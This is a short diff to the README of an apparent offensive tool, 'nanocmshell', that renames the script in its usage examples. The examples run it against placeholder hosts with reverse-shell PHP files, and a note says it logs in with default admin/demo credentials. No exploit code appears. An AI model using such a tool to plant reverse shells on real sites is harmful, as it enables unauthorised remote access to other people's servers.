@@ -42,9 +42,9 @@ options:
   -n, --no-colour       removes colour output
 
 examples:
-        python3 nanocmshellv2.py http://10.10.10.10/ rev.php
-        python3 nanocmshellv2.py http://hostname:8080 rev-shell.php -a
-        ./nanocmshellv2.py https://10.10.10.10 rev-shell -n -e -u 'user'
+        python3 nanocmshell http://10.10.10.10/ rev.php
+        python3 nanocmshell http://hostname:8080 rev-shell.php -a
+        ./nanocmshell https://10.10.10.10 rev-shell -n -e -u 'user'
 ```
 note: admin/demo are default credentials used but new ones can be supplied with `-u` and `-p` flags.
 
